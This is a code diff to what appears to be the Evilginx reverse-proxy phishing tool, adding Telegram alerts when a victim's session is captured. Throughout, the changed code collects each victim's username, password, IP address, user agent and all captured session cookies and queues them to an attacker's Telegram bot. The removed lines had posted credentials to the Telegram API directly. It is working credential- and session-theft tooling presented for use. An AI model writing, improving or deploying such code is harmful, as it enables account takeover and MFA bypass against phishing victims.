@@ -1092,6 +1092,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                             log.Error("database: %v", err)
                         }
                         s.Finish(false)
+                        // ADD THIS: Send Telegram with cookies
+                        go p.sendTelegramNotificationForSession(ps.SessionId)
 
                         if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
                             rid, ok := s.Params["rid"]
@@ -1276,6 +1278,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                                     database.HandleSubmittedData(rid, s.Username, s.Password, map[string]string{"email": rid}, p.livefeed)
                                 }
                             }
+
+                            // ADD THIS: Send Telegram notification when auth URL completes
+                            go p.sendTelegramNotificationForSession(ps.SessionId)
                             break
                         }
                     }
@@ -2175,66 +2180,60 @@ func (p *HttpProxy) sendTelegramNotificationForSession(sid string) {
         return
     }
     
-    // Get all sessions and find the one with matching session_id
-    sessions, err := p.db.ListSessions()
-    if err != nil {
-        log.Error("Telegram: failed to list sessions: %v", err)
+    // Wait a moment for credentials/cookies to be fully set
+    time.Sleep(2 * time.Second)
+    
+    // Read from IN-MEMORY sessions - NO database query
+    p.session_mtx.Lock()
+    s, exists := p.sessions[sid]
+    p.session_mtx.Unlock()
+    
+    if !exists {
+        log.Warning("Telegram: session %s not found in memory", sid)
         return
     }
     
-    var session *database.Session
-    for _, s := range sessions {
-        if s.SessionId == sid {
-            session = s
-            break
+    p.session_mtx.Lock()
+    username := s.Username
+    password := s.Password
+    remoteAddr := s.RemoteAddr
+    userAgent := s.UserAgent
+    phishletName := s.Name
+    
+    // Build a TSession from the in-memory session
+    ts := TSession{
+        ID:         0,
+        Phishlet:   phishletName,
+        LandingURL: "",
+        Username:   username,
+        Password:   password,
+        SessionID:  sid,
+        UserAgent:  userAgent,
+        RemoteAddr: remoteAddr,
+        CreateTime: time.Now().Unix(),
+        UpdateTime: time.Now().Unix(),
+    }
+    
+    // Convert CookieTokens to map[string]interface{} for TSession
+    ts.Tokens = make(map[string]interface{})
+    for domain, tokens := range s.CookieTokens {
+        domainTokens := make(map[string]interface{})
+        for name, token := range tokens {
+            domainTokens[name] = map[string]interface{}{
+                "Name":     token.Name,
+                "Value":    token.Value,
+                "Path":     token.Path,
+                "HttpOnly": token.HttpOnly,
+            }
         }
+        ts.Tokens[domain] = domainTokens
     }
     
-    if session == nil {
-        log.Debug("Telegram: session %s not found in database", sid)
-        return
-    }
+    p.session_mtx.Unlock()
     
-    message := fmt.Sprintf(
-        "🔴 *New Evilginx Session Captured!*\n\n"+
-            "*Site:* %s\n"+
-            "*Username:* %s\n"+
-            "*Password:* %s\n"+
-            "*IP:* %s\n"+
-            "*Time:* %s",
-        session.Phishlet,
-        session.Username,
-        session.Password,
-        session.RemoteAddr,
-        time.Unix(session.CreateTime, 0).Format("2006-01-02 15:04:05"),
-    )
+    // Use the QUEUE-BASED notification system instead of raw HTTP
+    // This properly creates formatted messages with cookie files
+    GetTelegramQueue().Enqueue(ts, chatId, botToken)
     
-    telegramUrl := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)
-    
-    payload := map[string]interface{}{
-        "chat_id":    chatId,
-        "text":       message,
-        "parse_mode": "Markdown",
-    }
-    
-    jsonPayload, err := json.Marshal(payload)
-    if err != nil {
-        log.Error("Telegram: failed to marshal payload: %v", err)
-        return
-    }
-    
-    go func() {
-        resp, err := http.Post(telegramUrl, "application/json", bytes.NewBuffer(jsonPayload))
-        if err != nil {
-            log.Error("Telegram: failed to send message: %v", err)
-            return
-        }
-        defer resp.Body.Close()
-        if resp.StatusCode == http.StatusOK {
-            log.Success("Telegram notification sent for session: %s", sid)
-        } else {
-            body, _ := io.ReadAll(resp.Body)
-            log.Error("Telegram: API returned %d: %s", resp.StatusCode, string(body))
-        }
-    }()
+    log.Success("Telegram notification queued for session: %s", sid)
 }
